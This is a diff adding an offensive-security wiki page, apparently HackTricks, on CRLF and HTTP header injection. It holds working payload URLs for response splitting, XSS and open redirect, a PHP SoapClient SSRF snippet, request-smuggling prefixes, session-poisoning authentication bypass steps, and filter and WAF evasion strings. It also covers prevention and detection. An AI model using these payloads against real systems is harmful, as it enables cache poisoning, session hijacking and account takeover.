@@ -1,0 +1,303 @@
+# CRLF (%0D%0A) Injection
+
+{{#include ../banners/hacktricks-training.md}}
+
+### CRLF
+
+Carriage Return (CR) and Line Feed (LF), collectively known as CRLF, are special character sequences used in the HTTP protocol to denote the end of a line or the start of a new one. Web servers and browsers use CRLF to distinguish between HTTP headers and the body of a response. These characters are universally employed in HTTP/1.1 communications across various web server types, such as Apache and Microsoft IIS.
+
+### CRLF Injection Vulnerability
+
+CRLF injection involves the insertion of CR and LF characters into user-supplied input. This action misleads the server, application, or user into interpreting the injected sequence as the end of one response and the beginning of another. While these characters are not inherently harmful, their misuse can lead to HTTP response splitting and other malicious activities.
+
+### Example: CRLF Injection in a Log File
+
+[Example from here](https://www.invicti.com/blog/web-security/crlf-http-header/)<sup>[[1]](#references)</sup>
+
+Consider a log file in an admin panel that follows the format: `IP - Time - Visited Path`. A typical entry might look like:
+
+```
+123.123.123.123 - 08:15 - /index.php?page=home
+```
+
+An attacker can exploit a CRLF injection to manipulate this log. By injecting CRLF characters into the HTTP request, the attacker can alter the output stream and fabricate log entries. For instance, an injected sequence might transform the log entry into:
+
+```
+/index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
+```
+
+Here, `%0d` and `%0a` represent the URL-encoded forms of CR and LF. Post-attack, the log would misleadingly display:
+
+```
+IP - Time - Visited Path
+
+123.123.123.123 - 08:15 - /index.php?page=home&
+127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
+```
+
+The attacker thus cloaks their malicious activities by making it appear as if the localhost (an entity typically trusted within the server environment) performed the actions. The server interprets the part of the query starting with `%0d%0a` as a single parameter, while the `restrictedaction` parameter is parsed as another, separate input. The manipulated query effectively mimics a legitimate administrative command: `/index.php?page=home&restrictedaction=edit`<sup>[[1]](#references)</sup>
+
+### HTTP Response Splitting
+
+#### Description
+
+HTTP response splitting occurs when attacker-controlled CRLF bytes terminate or create response headers and alter the response structure. Depending on the sink and surrounding infrastructure, this can enable header injection, redirects, cache poisoning, or cross-site scripting.<sup>[[1]](#references)</sup><sup>[[2]](#references)</sup><sup>[[4]](#references)</sup>
+
+#### XSS through HTTP Response Splitting
+
+1. The application sets a custom header like this: `X-Custom-Header: UserInput`
+2. The application fetches the value for `UserInput` from a query parameter, say "user_input". In scenarios lacking proper input validation and encoding, an attacker can craft a payload that includes the CRLF sequence, followed by malicious content.
+3. An attacker crafts a URL with a specially crafted 'user_input': `?user_input=Value%0d%0a%0d%0a<script>alert('XSS')</script>`
+   - In this URL, `%0d%0a%0d%0a` is the URL-encoded form of CRLFCRLF. It tricks the server into inserting a CRLF sequence, making the server treat the subsequent part as the response body.
+4. The server reflects the attacker's input in the response header, leading to an unintended response structure where the malicious script is interpreted by the browser as part of the response body.
+
+#### An example of HTTP Response Splitting leading to Redirect
+
+From [https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62](https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62)<sup>[[10]](#references)</sup>
+
+Browser to:
+
+```
+/%0d%0aLocation:%20http://myweb.com
+```
+
+And the server responses with the header:
+
+```
+Location: http://myweb.com
+```
+
+**Other example: (from** [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)**)**<sup>[[2]](#references)</sup>
+
+```
+http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
+```
+
+#### In URL Path
+
+You can send the payload **inside the URL path** to control the **response** from the server (example from [here](https://hackerone.com/reports/192667)):<sup>[[11]](#references)</sup>
+
+```
+http://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
+http://stagecafrstore.starbucks.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
+```
+
+Check more examples in:
+
+
+{{#ref}}
+https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md
+{{#endref}}
+
+### HTTP Header Injection
+
+HTTP Header Injection, often exploited through CRLF (Carriage Return and Line Feed) injection, allows attackers to insert HTTP headers. This can undermine security mechanisms such as XSS (Cross-Site Scripting) filters or the SOP (Same-Origin Policy), potentially leading to unauthorized access to sensitive data, such as CSRF tokens, or the manipulation of user sessions through cookie planting.
+
+#### Exploiting CORS via HTTP Header Injection
+
+An attacker can inject HTTP headers to enable CORS (Cross-Origin Resource Sharing), bypassing the restrictions imposed by SOP. This breach allows scripts from malicious origins to interact with resources from a different origin, potentially accessing protected data.
+
+#### SSRF and HTTP Request Injection via CRLF
+
+CRLF injection can be utilized to craft and inject an entirely new HTTP request. A notable example of this is the vulnerability in PHP's `SoapClient` class, specifically within the `user_agent` parameter. By manipulating this parameter, an attacker can insert additional headers and body content, or even inject a new HTTP request entirely. Below is a PHP example demonstrating this exploitation:
+
+```php
+$target = 'http://127.0.0.1:9090/test';
+$post_string = 'variable=post value';
+$crlf = array(
+    'POST /proxy HTTP/1.1',
+    'Host: local.host.htb',
+    'Cookie: PHPSESSID=[PHPSESSID]',
+    'Content-Type: application/x-www-form-urlencoded',
+    'Content-Length: '.(string)strlen($post_string),
+    "\r\n",
+    $post_string
+);
+
+$client = new SoapClient(null,
+    array(
+        'uri'=>$target,
+        'location'=>$target,
+        'user_agent'=>"IGN\r\n\r\n".join("\r\n",$crlf)
+    )
+);
+
+# Put a netcat listener on port 9090
+$client->__soapCall("test", []);
+```
+
+### Header Injection to Request Smuggling
+
+For more info about this technique and potential problems [**check the original source**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning).<sup>[[3]](#references)</sup>
+
+You can inject essential headers to ensure the **back-end keeps the connection open** after responding to the initial request:
+
+```
+GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1
+```
+
+Afterward, a second request can be specified. This scenario typically involves [HTTP request smuggling](http-request-smuggling/), a technique where extra headers or body elements appended by the server post-injection can lead to various security exploits.
+
+**Exploitation:**
+
+1. **Malicious Prefix Injection**: This method involves poisoning the next user's request or a web cache by specifying a malicious prefix. An example of this is:
+
+`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1`
+
+2. **Crafting a Prefix for Response Queue Poisoning**: This approach involves creating a prefix that, when combined with trailing junk, forms a complete second request. This can trigger response queue poisoning. An example is:
+
+`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1`
+
+### Memcache Injection
+
+Memcache is a **key-value store that uses a clear text protocol**. More info in:
+
+
+{{#ref}}
+../network-services-pentesting/11211-memcache/
+{{#endref}}
+
+**For the full information read the**[ **original writeup**](https://www.sonarsource.com/blog/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/)<sup>[[12]](#references)</sup>
+
+If a platform is taking **data from an HTTP request and using it without sanitizing** it to perform **requests** to a **memcache** server, an attacker could abuse this behaviour to **inject new memcache commands**.
+
+For example, in the original discovered vuln, cache keys were used to return the IP and port a user shuold connect to, and attackers were able to **inject memcache comands** that would **poison** the **cache to send the vistims details** (usrnames and passwords included) to the attacker servers:
+
+<figure><img src="../images/image (659).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/ba72cd16-2ca0-447b-aa70-5cde302a0b88/body-578d9f9f-1977-4e34-841c-ad870492328f_10.png?w=1322&h=178&auto=format&fit=crop"><figcaption></figcaption></figure>
+
+Moreover, researchers also discovered that they could desync the memcache responses to send the attackers ip and ports to users whose email the attacker didn't know:
+
+<figure><img src="../images/image (637).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/c6c1f3c4-d244-4bd9-93f7-2c88f139acfa/body-3f9ceeb9-3d6b-4867-a23f-e0e50a46a2e9_14.png?w=1322&h=506&auto=format&fit=crop"><figcaption></figcaption></figure>
+
+### Pre-auth Session File Poisoning via CRLF
+
+Some applications **persist session state before authentication completes** and later **reload the same session from disk** after additional requests. If attacker-controlled values from **headers**, **cookies**, or login parameters are written into that session file **without stripping `\r` / `\n`**, CRLF injection can become an **authentication bypass** instead of just response splitting.<sup>[[6]](#references)</sup><sup>[[7]](#references)</sup><sup>[[8]](#references)</sup>
+
+Typical exploitation pattern:
+
+1. A failed or incomplete login **creates a pre-auth session file** on disk.
+2. The attacker finds a field that is later written to the session store, commonly a **Basic Authorization** value, a **session cookie subfield**, or another login-related attribute.
+3. If the product uses a **structured session identifier** or cookie format, try **removing optional/expected segments** to force a weaker code path where attacker-controlled data is **not encoded/encrypted** before being persisted.
+4. Inject raw CRLF so the serialized session becomes **multi-line**, allowing creation of extra trusted entries such as:
+
+```text
+user=root
+cp_security_token=/cpsess...
+tfa_verified=1
+```
+
+5. Trigger a **session reload / resume** path. If the parser trusts the poisoned session file, the attacker upgrades a pre-auth session into an authenticated or privileged one.
+
+Quick notes for review and exploitation:
+
+- Check whether the session store is **line-oriented** (`key=value` per line). These formats are especially sensitive to CRLF.
+- Compare how the application handles a **freshly issued session cookie** versus a **malformed/truncated** version of the same cookie.
+- If authentication is split across several requests, inspect whether the **same session identifier survives** from the failed login into the later privileged request.
+- Newline injection into one field can be enough if the reload logic later trusts **presence of keys** such as `user`, `role`, `successful_external_auth_with_timestamp`, or `tfa_verified`.
+
+Detection / triage ideas:
+
+- Inspect pre-auth session files for **authenticated-only keys**.
+- Flag session files whose `pass` or equivalent field became **multi-line**.
+- Correlate **failed-login origins** with later session records containing valid security tokens or authenticated attributes.
+
+### How to Prevent CRLF / HTTP Header Injections in Web Applications
+
+To mitigate the risks of CRLF (Carriage Return and Line Feed) or HTTP Header Injections in web applications, the following strategies are recommended:
+
+1. **Avoid Direct User Input in Response Headers:** The safest approach is to refrain from incorporating user-supplied input directly into response headers.
+2. **Encode Special Characters:** If avoiding direct user input is not feasible, ensure to employ a function dedicated to encoding special characters like CR (Carriage Return) and LF (Line Feed). This practice prevents the possibility of CRLF injection.
+3. **Update Programming Language:** Regularly update the programming language used in your web applications to the latest version. Opt for a version that inherently disallows the injection of CR and LF characters within functions tasked with setting HTTP headers.
+
+### CHEATSHEET
+
+[Cheatsheet from here](https://twitter.com/NinadMishra5/status/1650080604174667777)<sup>[[13]](#references)</sup>
+
+```
+1. HTTP Response Splitting
+• /%0D%0ASet-Cookie:mycookie=myvalue (Check if the response is setting this cookie)
+
+2. CRLF chained with Open Redirect
+• //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2
+• /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
+• /google.com/%2F..%0D%0AHeader-Test:test2
+• /%0d%0aLocation:%20http://example.com
+
+3. CRLF Injection to XSS
+• /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
+• /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
+
+4. Filter Bypass
+• %E5%98%8A = %0A = \u560a
+• %E5%98%8D = %0D = \u560d
+• %E5%98%BE = %3E = \u563e (>)
+• %E5%98%BC = %3C = \u563c (<)
+• Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
+```
+
+### Recent Vulnerabilities (2023 – 2025)
+
+The last few years have produced several high-impact CRLF/HTTP header-injection bugs in widely-used server- and client-side components. Reproducing and studying them locally is an excellent way of understanding real-world exploitation patterns.
+
+| Year | Component | CVE / Advisory | Root cause | PoC highlight |
+|------|-----------|---------------|------------|---------------|
+| 2024 | RestSharp (≥110.0.0 <110.2.0) | **CVE-2024-45302**<sup>[[5]](#references)</sup> | The `AddHeader()` helper did not sanitize CR/LF, allowing construction of multiple request headers when RestSharp is used as an HTTP client inside back-end services. Down-stream systems could be coerced into SSRF or request smuggling. | `client.AddHeader("X-Foo","bar%0d%0aHost:evil")` |
+| 2024 | Refit (≤ 7.2.101) | **CVE-2024-51501** | Header attributes on interface methods were copied verbatim into the request. By embedding `%0d%0a`, attackers could add arbitrary headers or even a second request when Refit was used by server-side worker jobs. | `[Headers("X: a%0d%0aContent-Length:0%0d%0a%0d%0aGET /admin HTTP/1.1")]` |
+| 2023 | Apache APISIX Dashboard | **GHSA-4h3j-f5x9-r6x3** | User-supplied `redirect` parameter was echoed into a `Location:` header without encoding, enabling open redirect + cache poisoning. | `/login?redirect=%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>` |
+
+These bugs are important because they are triggered **inside application-level code** and not only at the web-server edge. Any internal component that performs HTTP requests or sets response headers must therefore enforce CR/LF filtering.
+
+### Advanced Unicode / Control-Character Bypasses
+
+Modern WAF/rewriter stacks often strip literal `\r`/`\n` but forget about other characters that many back-ends treat as line terminators. When CRLF is filtered, try:
+
+* `%E2%80%A8` (`U+2028` – LINE SEPARATOR)
+* `%E2%80%A9` (`U+2029` – PARAGRAPH SEPARATOR)
+* `%C2%85`  (`U+0085` – NEXT LINE)
+
+Some HTTP stacks have normalized non-ASCII line separators while validating only literal CR/LF. Apache HttpClient, for example, tracked a Unicode bypass in which a sanitized header value could still introduce a newline.<sup>[[9]](#references)</sup> Test the exact client, proxy, and back-end chain with classic payloads such as:
+
+```
+/%0A%E2%80%A8Set-Cookie:%20admin=true
+```
+
+If the filter normalises UTF-8 first, the control character is turned into a regular line-feed and the injected header is accepted.
+
+### WAF Evasion via Injected `Content-Encoding` and `Content-Length`
+
+When header injection permits both response metadata and a body boundary, an attacker can try injecting:
+
+```
+%0d%0aContent-Encoding:%20identity%0d%0aContent-Length:%2030%0d%0a
+```
+
+into a reflected header. If every intermediary preserves the injected fields and the resulting message framing, the attacker-controlled bytes after the header block may be interpreted as the response body, potentially producing XSS. `identity` means that no content coding has been applied; exploitability depends on the precise proxy and browser parsing behavior.<sup>[[3]](#references)</sup><sup>[[14]](#references)</sup>
+
+## Automatic Tools
+
+* [CRLFsuite](https://github.com/Raghavd3v/CRLFsuite) – fast active scanner written in Go.
+* [crlfuzz](https://github.com/dwisiswant0/crlfuzz) – wordlist-based fuzzer that supports Unicode newline payloads.
+* [crlfix](https://github.com/glebarez/crlfix) – 2024 utility that patches HTTP requests generated by Go programs and can be used standalone to test internal services.
+
+## Brute-Force Detection List
+
+- [carlospolop/Auto_Wordlists – crlf.txt](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/crlf.txt)
+
+## References
+
+- [1] [Invicti: What is CRLF injection and HTTP header injection?](https://www.invicti.com/blog/web-security/crlf-http-header/)
+- [2] [Acunetix: CRLF Injection](https://www.acunetix.com/websitesecurity/crlf-injection/)
+- [3] [PortSwigger Research: Making HTTP header injection critical via response queue poisoning](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning)
+- [4] [Netsparker: What Is CRLF / HTTP Header Injection?](https://www.netsparker.com/blog/web-security/crlf-http-header/)
+- [5] [NVD - CVE-2024-45302 (RestSharp CRLF injection)](https://nvd.nist.gov/vuln/detail/CVE-2024-45302)
+- [6] [Rapid7 - CVE-2026-41940: cPanel & WHM Authentication Bypass](https://www.rapid7.com/blog/post/etr-cve-2026-41940-cpanel-whm-authentication-bypass)
+- [7] [watchTowr - The Internet Is Falling Down, Falling Down, Falling Down (cPanel & WHM Authentication Bypass CVE-2026-41940)](https://labs.watchtowr.com/the-internet-is-falling-down-falling-down-falling-down-cpanel-whm-authentication-bypass-cve-2026-41940/)
+- [8] [cPanel Security Update 04/28/2026](https://support.cpanel.net/hc/en-us/articles/40073787579671-Security-CVE-2026-41940-cPanel-WHM-WP2-Security-Update-04-28-2026)
+- [9] [Apache HTTPCLIENT-1974: Unicode bypass of HTTP header CR/LF validation](https://issues.apache.org/jira/browse/HTTPCLIENT-1974)
+- [10] [Bugbounty: Exploiting CRLF Injection Can Land Into a Nice Bounty](https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62)
+- [11] [HackerOne Report #192667 - CRLF injection in the URL path](https://hackerone.com/reports/192667)
+- [12] [Sonarsource: Zimbra - Mail Stealing Clear-Text Credentials via Memcache Injection](https://www.sonarsource.com/blog/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/)
+- [13] [Ninad Mishra - CRLF cheatsheet](https://twitter.com/NinadMishra5/status/1650080604174667777)
+- [14] [RFC 9110, Section 8.4.1: Content Codings](https://www.rfc-editor.org/rfc/rfc9110.html#section-8.4.1)
+
+{{#include ../banners/hacktricks-training.md}}
